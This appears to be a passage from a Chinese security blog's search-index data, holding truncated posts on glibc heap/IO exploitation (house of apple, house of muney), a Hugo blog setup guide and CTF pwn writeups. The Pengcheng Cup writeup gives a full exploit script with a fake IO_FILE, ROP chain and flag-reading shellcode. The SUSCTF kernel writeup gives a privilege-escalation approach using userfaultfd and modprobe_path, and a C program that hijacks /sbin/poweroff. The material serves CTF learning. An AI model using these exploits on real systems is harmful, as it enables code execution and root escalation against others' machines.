这篇是house of apple1。 本站的house of apple系列文章的地址为： house of apple1 house of apple2 house of apple3 前言\r众所周知，glibc高版本逐渐移除了__malloc_hook/__free_hook/__realloc_hook等等一众hook全局变量，ctf中pwn题对hook钩子的利用将逐渐成为过去式。而想要在高版本利用成功，基本上就离不开对IO_FILE结构体的伪造与IO流的攻击。之前很多师傅都提出了一些优秀的攻击方法，比如house of pig、house of kiwi 和 house of emma等。 其中，house of pig除了需要劫持IO_FILE结构体，还需要劫持tcache_perthread_struct结构体或者能控制任意地址分配；house of kiwi则至少需要修改三个地方的值：_IO_helper_jumps + 0xA0和_IO_helper_jumps + 0xA8，另外还要劫持_IO_file_jumps + 0x60处的_IO_file_sync指针；而house of emma则至少需要修改两个地方的值，一个是tls结构体的point_guard(或者想办法泄露出来)，另外需要伪造一个IO_FILE或替换vtable为xxx_cookie_jumps的地址。 总的来看，如果想使用上述方法成功地攻击IO，至少需要两次写或者一次写和一次任意地址读。而在只给一次任意地址写（如一次largebin attack）的情景下是很难利用成功的。 largebin attack是高版本中为数不多的可以任意地址写一个堆地址的方法，并常常和上述三种方法结合起来利用。本文将给出一种新的利用方法，在仅使用一次largebin attack并限制读写次数的条件下进行FSOP利用。顺便说一下，house of banana 也只需要一次largebin attack，但是其攻击的是rtld_global结构体，而不是IO流。 上述方法利用成功的前提均是已经泄露出libc地址和heap地址。本文的方法也不例外。 利用条件\r使用house of apple的条件为： 1、程序从main函数返回或能调用exit函数 2、能泄露出heap地址和libc地址 3、 能使用一次largebin attack（一次即可） 利用原理\r原理解释均基于amd64程序。 当程序从main函数返回或者执行exit函数的时候，均会调用fcloseall函数，该调用链为： exit fcloseall _IO_cleanup _IO_flush_all_lockp _IO_OVERFLOW 最后会遍历_IO_list_all存放的每一个IO_FILE结构体，如果满足条件的话，会调用每个结构体中vtable-\u003e_overflow函数指针指向的函数。 使用largebin attack可以劫持_IO_list_all变量，将其替换为伪造的IO_FILE结构体，而在此时，我们其实仍可以继续利用某些IO流函数去修改其他地方的值。要想修改其他地方的值，就离不开_IO_FILE的一个成员_wide_data的利用。 struct _IO_FILE_complete { struct _IO_FILE _file; __off64_t _offset; /* Wide character stream stuff. */ struct _IO_codecvt *_codecvt; struct _IO_wide_data *_wide_data; // 劫持这个变量 struct _IO_FILE *_freeres_list; void *_freeres_buf; size_t __pad5; int _mode; /* Make sure we don't get into trouble again. */ char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)]; }; amd64程序下，struct _IO_wide_data *_wide_data在_IO_FILE中的偏移为0xa0： amd64： 0x0:'_flags', 0x8:'_IO_read_ptr', 0x10:'_IO_read_end', 0x18:'_IO_read_base', 0x20:'_IO_write_base', 0x28:'_IO_write_ptr', 0x30:'_IO_write_end', 0x38:'_IO_buf_base', 0x40:'_IO_buf_end', 0x48:'_IO_save_base', 0x50:'_IO_backup_base', 0x58:'_IO_save_end', 0x60:'_markers', 0x68:'_chain', 0x70:'_fileno', 0x74:'_flags2', 0x78:'_old_offset', 0x80:'_cur_column', 0x82:'_vtable_offset', 0x83:'_shortbuf', 0x88:'_lock', 0x90:'_offset', 0x98:'_codecvt', 0xa0:'_wide_data', 0xa8:'_freeres_list', 0xb0:'_freeres_buf', 0xb8:'__pad5', 0xc0:'_mode', 0xc4:'_unused2', 0xd8:'vtable' 我们在伪造_IO_FILE结构体的时候，伪造_wide_data变量，然后通过某些函数，比如_IO_wstrn_overflow就可以将已知地址空间上的某些值修改为一个已知值。 static wint_t _IO_wstrn_overflow (FILE *fp, wint_t c) { /* When we come to here this means the user supplied buffer is filled. But since we must return the number of characters which would have been written in total we must provide a buffer for further use. We can do this by writing on and on in the overflow buffer in the _IO_wstrnfile structure. */ _IO_wstrnfile *snf = (_IO_wstrnfile *) fp; if (fp-\u003e_wide_data-\u003e_IO_buf_base != snf-\u003eoverflow_buf) { _IO_wsetb (fp, snf-\u003eoverflow_buf, snf-\u003eoverflow_buf + (sizeof (snf-\u003eoverflow_buf) / sizeof (wchar_t)), 0); fp-\u003e_wide_data-\u003e_IO_write_base = snf-\u003eoverflow_buf; fp-\u003e_wide_data-\u003e_IO_read_base = snf-\u003eoverflow_buf; fp-\u003e_wide_data-\u003e_IO_read_ptr = snf-\u003eoverflow_buf; fp-\u003e_wide_data-\u003e_IO_read_end = (snf-\u003eoverflow_buf + (sizeof (snf-\u003eoverflow_buf) / sizeof (wchar_t))); } fp-\u003e_wide_data-\u003e_IO_write_ptr = snf-\u003eoverflow_buf; fp-\u003e_wide_data-\u003e_IO_write_end = snf-\u003eoverflow_buf; /* Since we are not really interested in storing the characters which do not fit in the buffer we simply ignore it. */ return c; } 分析一下这个函数，首先将fp强转为_IO_wstrnfile *指针，然后判断fp-\u003e_wide_data-\u003e_IO_buf_base != snf-\u003eoverflow_buf是否成立（一般肯定是成立的），如果成立则会对fp-\u003e_wide_data的_IO_write_base、_IO_read_base、_IO_read_ptr和_IO_read_end赋值为snf-\u003eoverflow_buf或者与该地址一定范围内偏移的值；最后对fp-\u003e_wide_data的_IO_write_ptr和_IO_write_end赋值。 也就是说，只要控制了fp-\u003e_wide_data，就可以控制从fp-\u003e_wide_data开始一定范围内的内存的值，也就等同于任意地址写已知地址。 这里有时候需要绕过_IO_wsetb函数里面的free： void _IO_wsetb (FILE *f, wchar_t *b, wchar_t *eb, in","date":"2022-10-18","objectID":"/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1/:0:0","tags":["pwn","glibc","house of"],"title":"House of Apple 一种新的glibc中IO攻击方法 (1)","uri":"/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1/"},{"categories":["tools"],"content":"To build a blog site on aliyun with hugo and even theme","date":"2022-10-11","objectID":"/zh-cn/2022-10-11-%E4%BD%BF%E7%94%A8aliyun-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","tags":["blog","hugo","even","FixIt"],"title":"[建站教程] 使用aliyun+hugo搭建个人博客","uri":"/zh-cn/2022-10-11-%E4%BD%BF%E7%94%A8aliyun-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"categories":["tools"],"content":"整个搭建过程中，云服务器配置耗费时间需要1~2周，而在配置云服务器过程中占用时间最长的为域名备案，最长需要等待2周才能完成；剩下的几步只需要不到两个小时的时间即可完成。 使用云服务器VPS和hugo搭建个人博客的端到端教程。本篇教程以aliyun服务器为例，使用hugo的even主题，并在原有主题的基础参考其issue和pr上进行了自定义修改。本教程操作主要在windows系统上进行，换到linux系统也大同小异。 本文分为7个章节： 0、前言 1、云服务配置 2、hugo使用方法 3、even主题配置 4、nginx反向代理 5、教程总结 6、引用与参考 ChangeLog\r2023-04-05更新\r因为某些原因，我将重新启用roderickchan.github.io这个域名（本来打算归档的，但是人算不如天算）。原来写的文档（基本全是些学习pwn的时候写的wp）也会保留下来（但是评论都没了）。估计又得折腾半天了😟 之后，以下两个域名提供的博客内容是一样的： https://www.roderickchan.cn https://roderickchan.github.io 域名roderickchan.cn可能某一天无法访问，但是github pages应该是永远（只要github不作妖）能访问的。所以，需要收藏我的文章的话如果有人看，请优先roderickchan.github.io。 切换到github page非常方便，直接push博客目录下的publibc的所有内容到you-github-username.github.io这个仓库下即可。 2023-03-13更新\r使用algolia来搭建search database，按照这个博客使用 Algolia 云引擎，实现个人博客 Hugo 本地智能搜索_回忆中的明天的博客-CSDN博客的教程一步一步搭建即可，fixit主题只需要把相关配置弄好就行。最后给出一个python实现的上传index.json模板： # z # uv run --with algoliasearch==3.0.0 .\\all-in-one.py from algoliasearch.search_client import SearchClient import json # https://www.algolia.com/doc/api-client/getting-started/install/python/?client=python def upload(appid, adminkey, indexname, jsonfilepath): client = SearchClient.create(appid, adminkey) index = client.init_index(indexname) # search # objects = index.search('glibc') # print(objects) with open(jsonfilepath, \"rb\") as f: records = json.load(f) index.save_objects(records, {'autoGenerateObjectIDIfNotExist': True}) print(f\"upload {jsonfilepath} success!\") client.close() if __name__ == \"__main__\": index_en = \"index.en\" json_zh_path = \"./public/index.json\" json_en_path = \"./public/en/index.json\" index_zh = \"index.zh-cn\" application_id = \"\" admin_key = \"\" upload(application_id, admin_key, index_zh, json_zh_path) upload(application_id, admin_key, index_en, json_en_path) 2023-02-27 更新\r使用waline部署评论系统，参照以下文档进行操作即可： Waline | Waline Waline 评论系统的介绍与基础配置 | 荷戟独彷徨 (guanqr.com) 可以免费部署，设置邮件提醒功能。 特别是邮件提醒功能，他真的，我哭死😭（想到了之前用valine实现邮件通知时候因为是开发版环境实例被强制休眠的痛）。 2023-02-26 更新\r虽然even很好用，但是其缺乏搜索功能，并且如果使用proxy的话，用lunr搜索会失败。 所以虽然使用hugo的第一个博客主题是even，但我还是不舍地换成了FixIt。 虽然换了FixIt，但我想本文的标题还是需要包含even，毕竟大部分内容都与even有关。 考察多个主题后，最后选用了hugo-fixit/FixIt: 🔧 A clean, elegant but advanced blog theme for Hugo 一个简洁、优雅且高效的 Hugo 主题 (github.com)。不得不说这个主题做得真的非常好~ 可以针对某个专题进行分类 使用algolia在线搜索（虽然还要上传index.json，但是总算能实现搜索功能了） 支持day/night切换 支持很多种shortcodes …… 于是，在这个周末花了一天时间，把博客主题迁移到了FixIt。主要工作量是需要根据作者的模板修改自己的配置。 0 前言\r我最开始搭建博客使用的解决方案为github.io + hexo + icarus，该方案的优点是github.io自带域名，不需要购买额外的域名，一次搭建成功后，往后只需要专注于写作即可。但是，其缺点也是显而易见的。 首先，github域名在国内访问不够方便；其次，hexo的部署也稍显麻烦，想要部署成功除了需要安装nodejs，还需要安装一大堆依赖包，其安装成本较大，安装过程繁琐，更换电脑后博客迁移步骤繁琐。 起初本来想着制作一个docker镜像来避免在不同电脑上的重复安装工作，然而，并不是每个电脑都支持运行docker，而制作镜像的事情一直拖着至今都未开始做。 使用hugo搭建博客的好处有： hugo安装简单，只有一个二进制文件 theme配置简便 博客迁移便捷 简单，才是最强大的。 1 云服务器配置\r1.1 购买云服务器和域名\r要想从世界上任何一个地方都访问到你的博客站点，你需要一个公网IP，云服务器可以提供一个静态的公网IP。当然，还有其他获取公网IP的办法，可自行搜索。 国内云服务器的厂商很多，我选择的是阿里云。主要是因为阿里云的服务器第一年很便宜。如果买最低的配置，第一年只需要40块钱左右。但是，几乎所有的云服务器都有一个共同的特点：续费很贵。所以要买的话，建议3年起买。 关于云服务器的选择，直接选最低的配置即可满足要求，一般的配置是：1G内存+2核CPU + 40G系统盘。如果还想把服务器拿来穿透一些内网服务的话，建议加大带宽。根据我的经验，带宽和价格似乎并不是呈线性关系，带宽越高，价格翻倍得越离谱。 由于阿里云同时提供域名注册服务，所以我直接在阿里云上购买了域名。 1.2 相关配置\r主要有服务器的配置和域名配置 1、ssh服务配置 系统一般自带了ssh服务，如果没有的话，可以自己装一个。装完之后，修改/etc/ssh/sshd_config文件，主要修改项为： # 禁止root登录 PermitRootLogin no # 使用公钥认证 PubkeyAuthentication yes # 禁止密码认证 PasswordAuthentication no # 公钥存储文件 AuthorizedKeysFile .ssh/authorized_keys 然后把自己的公钥传到服务器上，使用私钥登录以保证服务器的安全。 2、域名配置 注册好域名后，首先给域名添加两条DNS解析记录： 如图所示，此处需要替换记录值为你的公网IP和域名。 注册完成后，申请免费的ssl证书，用于后续配置https服务或者tls证书。如下图所示。 20个免费证书绝对够用了。 接着需要做的事情是最耗时的：域名ICP备案。不备案的话，是无法访问域名的80和443端口的。 直接在阿里云里面搜索域名备案，然后按照流程走完备案就行。域名备案中比较麻烦的点： 网站名称不能包含博客这两个字，所以需要使用其他名称 记住自己填写的信息，有人会打电话过来审核询问 域名备案大概1~2周的时间，通过后会有短信和邮件通知。域名备案完成后，到服务器的安全组把80和443端口放行。如下图所示： 2 Hugo使用方法\rhugo使用非常简单。直接到官网上下载最新版本的hugo，建议下载带有extend版本的，因为大多数主题都需要扩展版本。 我在windows系统上使用hugo，所以直接下载hugo_extended_XXXXX_windows-amd64.zip，然后解压。 解压后可以把存放hugo.exe的文件夹路径加入到系统环境变量，不过我经常使用powershell去执行hugo.exe，所以我并没有添加。 接下来，执行hugo.exe new site XXXXXX， 这里的XXXXXX自定义即可，会生成一个目录，里面存放博客的相关文件。 然后cd XXXXXX，进入刚刚创建的目录，执行hugo.exe server就能在本地起一个http服务。访问http://localhost:13","date":"2022-10-11","objectID":"/zh-cn/2022-10-11-%E4%BD%BF%E7%94%A8aliyun-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/:0:0","tags":["blog","hugo","even","FixIt"],"title":"[建站教程] 使用aliyun+hugo搭建个人博客","uri":"/zh-cn/2022-10-11-%E4%BD%BF%E7%94%A8aliyun-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"categories":["pwn-wp"],"content":"2022-鹏程杯-Ctf-Pwn\r简单复盘与总结一下，qemu逃逸的题目还有点意思，其他都是常规题。附件下载链接 A_fruit\r题目分析\r在delete分支有UAF： 利用思路\r考虑到题目中存在exit，且可以进行1次largebin attack，因此直接用我提出的house of apple套现有的脚本模板去解题。 EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] def add(size): sla(\"5.Exit\\n\", \"1\") sla(\"Input size:\\n\", str(size)) def edit(i, data): sla(\"5.Exit\\n\", \"2\") sla(\"Input index:\\n\", str(i)) sa(\"Input content:\", data) def show(i): sla(\"5.Exit\\n\", \"3\") sla(\"Input index:\\n\", str(i)) m = rs(2) m = [int16_ex(x) for x in m] log_ex(f\"Get msg: {m}\") return m def dele(i): sla(\"5.Exit\\n\", \"4\") sla(\"Input index:\\n\", str(i)) add(0x410) # 0 add(0x420) # 1 add(0x420) # 2 add(0x410) # 3 dele(0) a1, a2 = show(0) _p = process([\"./calc\", str(a1)]) data = _p.recvline_startswith(\"find\", timeout=300) _p.close() a1 = int16_ex(data[6:]) _p = process([\"./calc\", str(a2)]) data = _p.recvline_startswith(\"find\", timeout=120) _p.close() a2 = int16_ex(data[6:]) leak_addr = (a2 \u003c\u003c 32) + a1 log_address(\"leak addr\", leak_addr) libc_base = set_current_libc_base_and_log(leak_addr, 0x1e0c00) dele(2) a1, a2 = show(2) _p = process([\"./calc\", str(a1)]) data = _p.recvline_startswith(\"find\", timeout=300) _p.close() a1 = int16_ex(data[6:]) _p = process([\"./calc\", str(a2)]) data = _p.recvline_startswith(\"find\", timeout=120) _p.close() a2 = int16_ex(data[6:]) leak_addr = (a2 \u003c\u003c 32) + a1 log_address(\"leak addr\", leak_addr) heap_base = leak_addr - 0x290 log_address(\"heap base\", heap_base) add(0x410) # 4 add(0x430) # 5 dele(4) # largebin attack target_addr = libc.sym._IO_list_all edit(2, flat(0, 0, 0, target_addr - 0x20)) add(0x430) fake_IO_addr = heap_base + 0x290 chain = fake_IO_addr + 0x120 _lock = libc_base + 0x1e3660 point_guard_addr = libc_base + 0x1ed5b0 _IO_wstrn_jumps = libc_base + 0x1e1c60 _IO_cookie_jumps = libc_base + 0x1e1a20 f1 = IO_FILE_plus_struct() f1._IO_write_base = 0 f1._IO_write_ptr = 1 f1.chain = chain f1._flags2 = 8 f1._mode = 0 f1._lock = _lock f1._wide_data = point_guard_addr f1.vtable = _IO_wstrn_jumps f2 = IO_FILE_plus_struct() f2._IO_write_base = 0 f2._IO_write_ptr = 1 f2._lock = _lock f2._mode = 0 f2._flags2 = 8 f2.vtable = _IO_cookie_jumps + 0x58 now_pointer = heap_base + 0x380 # 0x000000000010822d: add rsp, 0x30; pop rbx; ret; # 0x0000000000059020: mov rsp, rdx; ret; # 0x000000000014a0a0: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; # 0x0000000000028a55: pop rdi; ret; # 0x000000000002a4cf: pop rsi; ret; # 0x00000000000c7f32: pop rdx; ret; magic_gadget = libc_base + 0x000000000014a0a0 data = flat({ 0: bytes(f1)[0x10:], 0x110: { 0: bytes(f2), 0xe0: [heap_base + 0x4a0, rol(magic_gadget ^ now_pointer, 0x11), [ libc_base + 0x000000000010822d, # 0x4a0 heap_base + 0x4a0, 0, 0, 0x0000000000059020 + libc_base, 0, 0, 0, [ 0x0000000000028a55 + libc_base, heap_base, 0x000000000002a4cf + libc_base, 0x10000, libc_base + 0x00000000000c7f32, 7, libc.sym.mprotect, fake_IO_addr+0x300, ] ] ] }, 0x2f0: ShellcodeMall.amd64.cat_flag }) edit(4, data) sla(\"5.Exit\\n\", \"5\") ia() 当然，需要手写一个calc.c去计算地址： #include \u003cstdio.h\u003e #include \u003cstdint.h\u003e #include \u003cunistd.h\u003e #include \u003cstdlib.h\u003e void func(uint32_t start, uint32_t end, uint32_t num) { uint32_t x = start; while (x \u003c end) { uint32_t a1 = x; for (int i = 0xA; i \u003e 0; --i ) a1 ^= ((a1 ^ (0x30 * a1)) \u003e\u003e 0x15) ^ (0x30 * a1) ^ ((a1 ^ (0x30 * a1) ^ ((a1 ^ (0x30 * a1)) \u003e\u003e 0x15)) \u003c\u003c 0x11); if (a1 == num) { printf(\"find: 0x%x\\n\", x); } ++x; } } int main(int argc, char **argv, char**env) { setbuf(stdin, 0); setbuf(stdout, 0); uint32_t num = (uint32_t)atoi(argv[1]); printf(\"num: %u\\n\", num); int p1, p2, p3; p1 = fork(); if (p1 == 0) { func(0, 0x40000000, num); exit(0); } else { p2 = fork(); if (p2 == 0) { func(0x40000000, 0x80000000, num); exit(0); } else { p3 = fork(); if (p3 == 0) { func(0x80000000, 0xc0000000, num); exit(0); } else { func(0xc0000000, 0xffffffff, num); } } } waitpid(0); return puts(\"done!\"); } Fruit","date":"2022-07-06","objectID":"/zh-cn/2022-07-06-2022-%E9%B9%8F%E7%A8%8B%E6%9D%AF-ctf-pwn/:0:0","tags":["pwn"],"title":"2022-鹏程杯-ctf-pwn","uri":"/zh-cn/2022-07-06-2022-%E9%B9%8F%E7%A8%8B%E6%9D%AF-ctf-pwn/"},{"categories":["pwn-wp"],"content":"Susctf-2022-Pwn 复现\r很久没有做题了，找了最近的几次比赛试题复现一下。xctf的题目质量一向不错，首先复现一下susctf2022的所有pwn题。 4-Kqueue\r当控制了rip后，可以利用pt_regs结构体，然后使用pop rsp; ret这个gadget把栈迁移到用户地址空间，接着利用一些gadgets把modprobe_path修改为自定义路径 seq_operations结构体控制后，当调用read(fd, data, 0)的时候，会先调start指针，然后调show指针，然后调stop指针 直接调用swapgs_restore_regs_and_return_to_usermode，从mov rdi, cr3处开始返回用户态，布局如下： swapgs_restore_regs_and_return_to_usermode+offset 0 0 get_shell_address user_cs user_eflags user_sp user_ss 题目分析\r首先修改启动脚本： #!/bin/bash set -ex gcc exp2.c -o ./rootfs/home/ctf/exp2 -static -w gcc exp.c -o ./rootfs/home/ctf/exp -static -w -lpthread cd ./rootfs find . | cpio -o --format=newc \u003e ../rootfs.cpio cd .. stty intr ^] # 避免ctrl + c 结束qemu fakeroot -- \\ qemu-system-x86_64 \\ -initrd rootfs.cpio \\ -kernel bzImage\\ -append 'console=ttyS0 root=/dev/ram oops=panic panic=1 quiet nokaslr' \\ # 关闭kaslr -monitor /dev/null \\ -m 64M \\ --nographic \\ -no-reboot \\ -smp cores=2,threads=2 \\ -cpu kvm64,+smep,smap \\ -s # 开启调试端口 然后添加一个gdb脚本： #!/bin/sh gdb-multiarch ./vmlinux \\ -ex 'target remote 127.0.0.1:1234' \\ -ex 'add-symbol-file vmlinux 0xffffffff81000000' \\ -ex 'add-symbol-file kqueue.ko 0xffffffffc0000000' \\ -ex 'b *0xffffffffc0000058' \\ 并可以在init脚本中添加以方便调试： cat /proc/kallsyms \u003e /tmp/kallsyms cat /sys/module/kqueue/sections/.text \u003e /tmp/modules cat /sys/module/kqueue/sections/.bss \u003e\u003e /tmp/modules 题目是一个循环链表，梳理出结构体如下： struct Queue { Node *head; Node *tail; u64 num; u64 head_lock; char _1[24]; u64 tail_lock; }; struct Node { u64 idx; char data[8]; Node *next; }; Kqueue_init\r模块初始化的时候，申请了kmalloc-96的chunk并给全局变量queue赋值，然后申请了一个node： Kqueue_ioctl\r添加的时候从tail尾部添加，如果拷贝失败，就会释放申请的node。但是由于已经把next域给赋值了，所以这里存在一个UAF。 删除的时候，从头部删除，但是拷贝的是下一个node的数据。这个很重要。 总结一下流程就是： 利用思路\r这题的附件有很大的bug，/bin目录以及/sbin对ctf用户都可以写。观察一下init脚本，发现结束后调用了mount命令和poweroff命令，所以只需要修改软连接为自定义脚本即可。 #include \u003cstdlib.h\u003e int main() { system(\"mv /sbin/poweroff /sbin/poweroff.bk\"); system(\"echo '#!/bin/sh' \u003e /tmp/poweroff\"); system(\"echo 'cat /flag' \u003e\u003e /tmp/poweroff\"); system(\"chmod +x /tmp/poweroff\"); system(\"ln -s /tmp/poweroff /sbin/poweroff\"); return 0; } 然后输入exit退出的时候，可以直接获得flag。 说完非预期解，那么如果按照预期解法，思路如下： 因为存在UAF，所以当添加node的时候，传入一个非法地址使得copy_from_user失败，就能给next域赋值，然后使用seq_operations占位这个chunk，即可泄露出kernel text基地址。 然后两次释放seq_operations所在的chunk过程中，结合userfaultfd去修改stop指针为任意地址 结合pt_regs结构体，使用栈迁移修改modprobe_path即可读取flag EXP\r#define DEBUG 1 #include \"helpful.h\" const char *DEV_NAME = \"/dev/kqueue\"; int g_fd, g_seq_fd; extern size_t g_user_cs, g_user_ss, g_user_sp, g_user_eflags; extern size_t g_prepare_kernel_cred_addr, g_commit_creds_addr; extern size_t g_vmlinux_base_addr; extern size_t *g_buffer; extern size_t g_r15, g_r14, g_r13, g_r12, g_rbp, g_rbx, g_r11, g_r10, g_r9, g_r8, g_rdx, g_rcx, g_rax, g_rsi, g_rdi; extern ssize_t g_process_userfault_running; void add(void *data) { assert(g_fd \u003e 0); ioctl(g_fd, 0x1314001, data); } void dele(void *data) { assert(g_fd \u003e 0); ioctl(g_fd, 0x1314002, data); } void prepare() { bindcpu(0); save_status(); prepare_for_modprobe_path(\"/tmp/aa\"); g_fd = open(DEV_NAME, O_RDWR); assert(g_fd \u003e 0); success(\"prepare work done!\"); } void helper(void *page) { // add rsp, 0x160; pop rbx; pop r12; pop r13; pop rbp; ret; size_t gadget = GET_GADGET_REAL_ADDR(0xffffffff810494c5); memcpy(page, \u0026gadget, 8); close(g_seq_fd); g_seq_fd = open(\"/proc/self/stat\", O_RDONLY); info(\"now g_seq_fd is: %d\", g_seq_fd); sleep(1); } void get_flag() { system(\"/tmp/dummy\"); system(\"cat /flag\"); get_root_shell_ex(); } void funcA(void *page) { size_t data = 0; dele(\u0026data); add(page); } void hacker() { ssize_t seq; size_t data = 0; void *page = get_mmap_rw(0, PAGE_SIZE); register_userfault(page, \u0026userfaultfd_stuck_handler, \u0026helper, 0); info(\"try to leak kernel address.\"); add(0xdeadbeef); g_seq_fd = open(\"/proc/self/stat\", O_RDONLY); dele(\u0026data); g_vmlinux_base_addr = data - 0x10d4b0; assert(g_vmlinux_base_addr \u003e\u003e 56 == 0xff); info(\"leak kernel base address: 0x%lx\", g_vmlinux_base_addr); info(\"try to change modprobe_path.\"); pthread_t tid; pthread_create(\u0026tid, NULL, \u0026f","date":"2022-06-29","objectID":"/zh-cn/2022-06-29-susctf-2022-pwn-review/:0:0","tags":["pwn"],"title":"susctf-2022-pwn-review","uri":"/zh-cn/2022-06-29-susctf-2022-pwn-review/"},{"categories":["pwn-trick"],"content":"house of muney","date":"2022-06-18","objectID":"/zh-cn/2022-06-18-glibcheap-house-of-muney/","tags":["pwn","house of","glibc"],"title":"GlibcHeap-house of muney","uri":"/zh-cn/2022-06-18-glibcheap-house-of-muney/"},{"categories":["pwn-trick"],"content":" house of muney的学习笔记。 前言\r遇到了好几次hosue of muney相关的题目，之前并没有深入地分析house of muney的原理，只是了解了一个大概。这次详细分析一下原理与相关源码，并尝试挖掘出一些新的东西出来。 本次调试基于ubuntu 20.04 2.31-0ubuntu9.9，自己写的poc，会与原有的poc相比有改动。 利用原理\r要理解house of muney的利用，就必须清楚elf文件的动态链接过程。从《链接、装载与库》这本书里面就对ELF文件有着深入的剖析。这里不详细的说明elf文件的组成格式与装载流程，只会涉及到符号解析的部分。 ELF文件解析\r众所周知，解析ELF文件只需要解析好文件头即可。ELF文件头定义好了静态视图下的ELF文件和动态视图下的ELF文件。首先简要说一下静态视图。 静态视图下，组成elf文件的基本单位是section，可以翻译为节。elf头会定义节头表（这里插播一句，所谓的表，其实都是数组，数组的每个元素都是一个结构体，比如dyn/rel等），节头表中定义了节的数量、每个节的类型、起始的虚拟地址。与动态链接相关的节为.dynamic节，这里面存储这与动态链接相关的描述信息。使用readelf查看.dynamic，这里以pwncli/examples文件夹下的stackoverflow_pie文件为例。 $ readelf -d stackoverflow_pie Dynamic section at offset 0xdf8 contains 26 entries: Tag Type Name/Value 0x0000000000000001 (NEEDED) Shared library: [libc.so.6] 0x000000000000000c (INIT) 0x610 0x000000000000000d (FINI) 0x8d4 0x0000000000000019 (INIT_ARRAY) 0x200de8 0x000000000000001b (INIT_ARRAYSZ) 8 (bytes) 0x000000000000001a (FINI_ARRAY) 0x200df0 0x000000000000001c (FINI_ARRAYSZ) 8 (bytes) 0x000000006ffffef5 (GNU_HASH) 0x298 0x0000000000000005 (STRTAB) 0x3e0 0x0000000000000006 (SYMTAB) 0x2c0 0x000000000000000a (STRSZ) 163 (bytes) 0x000000000000000b (SYMENT) 24 (bytes) 0x0000000000000015 (DEBUG) 0x0 0x0000000000000003 (PLTGOT) 0x201000 0x0000000000000002 (PLTRELSZ) 120 (bytes) 0x0000000000000014 (PLTREL) RELA 0x0000000000000017 (JMPREL) 0x598 0x0000000000000007 (RELA) 0x4c0 0x0000000000000008 (RELASZ) 216 (bytes) 0x0000000000000009 (RELAENT) 24 (bytes) 0x000000006ffffffb (FLAGS_1) Flags: PIE 0x000000006ffffffe (VERNEED) 0x4a0 0x000000006fffffff (VERNEEDNUM) 1 0x000000006ffffff0 (VERSYM) 0x484 0x000000006ffffff9 (RELACOUNT) 3 0x0000000000000000 (NULL) 0x0 这里的.dynamic实际是一个数组，数组的每一个元素对应的数据结构为： typedef struct { Elf64_Sxword d_tag; /* Dynamic entry type */ union { Elf64_Xword d_val; /* Integer value */ Elf64_Addr d_ptr; /* Address value */ } d_un; } Elf64_Dyn; 这里的tag表示的是节的类型，也就是上面使用readelf打印出来的，在小括号中表示的如：INIT,FINI和STRTAB等等。第二个成员是一个联合体，有时候表示的是这个节处在节表中的下标，而有时候则表示这个节的虚拟地址。与符号查找相关的就是这里的STRTAB和SYMTAB。 这两个表分别是字符串表 和符号表，字符串表就是一大串字符串，包含整个程序中所使用到的所有字符。符号表则表示符号的定义，其对应的数据结构为： typedef struct { Elf64_Word st_name; /* Symbol name (string tbl index) */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility */ Elf64_Section st_shndx; /* Section index */ Elf64_Addr st_value; /* Symbol value */ Elf64_Xword st_size; /* Symbol size */ } Elf64_Sym; 这里需要注意，第一个成员的大小为4字节，表示的意思是这个符号所描述的字符串在字符串表中的下标。那么，如果修改了这个下标，就能解析出不同的符号地址。还有一个需要关注的成员是st_value，表示符号的值。而当符号是一个函数或者变量的时候，这个值就代表符号的虚拟地址，如果开启了PIE，那么符号的实际地址就是加载的基地址加上这个值。 符号表和字符串表描述了怎么找到符号，但是如何标识哪些符号需要重定位，则需要使用到重定位表。使用 readelf查看重定位表。 $ readelf -r ./stackoverflow_pie Relocation section '.rela.dyn' at offset 0x4c0 contains 9 entries: Offset Info Type Sym. Value Sym. Name + Addend 000000200de8 000000000008 R_X86_64_RELATIVE 7a0 000000200df0 000000000008 R_X86_64_RELATIVE 760 000000201048 000000000008 R_X86_64_RELATIVE 201048 000000200fd8 000100000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_deregisterTMClone + 0 000000200fe0 000700000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0 000000200fe8 000800000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0 000000200ff0 000900000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCloneTa + 0 000000200ff8 000a00000006 R_X86_64_GLOB_DAT 0000000000000000 __cxa_finalize@GLIBC_2.2.5 + 0 000000201050 000b00000005 R_X86_64_COPY 0000000000201050 stdout@GLIBC_2.2.5 + 0 Relocation section '.rela.plt' at offset 0x598 contains 5 entries: Offset Info Type Sym. Value Sym. Name + Addend 000000201018 000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0 000000201020 000300000007 R_X86_64_JUMP_SLO 0000000000000000 setbuf@GLIBC_2.2.5 + 0 000000201028 000400000007 R_X86_64_JUMP_SLO 0000000000000000 system@GLIBC_2.2.5 + 0 000000201030 000500000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0 000000201038 000600000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0 重定位表的数据结构为： typedef struct { Elf64_A","date":"2022-06-18","objectID":"/zh-cn/2022-06-18-glibcheap-house-of-muney/:0:0","tags":["pwn","house of","glibc"],"title":"GlibcHeap-house of 